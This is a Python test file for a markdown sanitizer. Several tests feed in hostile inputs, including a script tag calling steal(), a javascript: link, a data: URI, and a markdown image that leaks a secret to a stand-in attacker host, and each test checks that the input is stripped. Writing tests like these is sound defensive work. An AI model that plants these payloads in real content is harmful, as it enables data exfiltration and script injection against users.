from arrowhead.content.markdown_safe import sanitize_markdown


def test_raw_html_stripped():
    out = sanitize_markdown("before <script>steal()</script> after")
    assert "<script>" not in out
    assert "</script>" not in out


def test_image_url_defanged():
    out = sanitize_markdown("![leak](http://attacker.example/?secret=abc)")
    assert "attacker.example" not in out
    assert "image removed" in out


def test_https_link_kept():
    out = sanitize_markdown("[docs](https://example.com/page)")
    assert "https://example.com/page" in out


def test_relative_link_kept():
    out = sanitize_markdown("[next](./page.md)")
    assert "./page.md" in out


def test_dangerous_scheme_link_dropped():
    out = sanitize_markdown("[click](javascript:alert(1))")
    assert "javascript:alert" not in out
    assert "[click]" in out


def test_autolinked_dangerous_scheme_neutralized():
    out = sanitize_markdown("visit data:text/html,<h1>x</h1> now")
    assert "data:text/html" not in out


def test_plain_text_unchanged():
    assert sanitize_markdown("# Title\n\nSome plain text.") == (
        "# Title\n\nSome plain text."
    )


def test_prose_colon_not_mangled():
    # "data:" followed by a space is prose, not a URI, and must survive.
    assert sanitize_markdown("the data: here") == "the data: here"
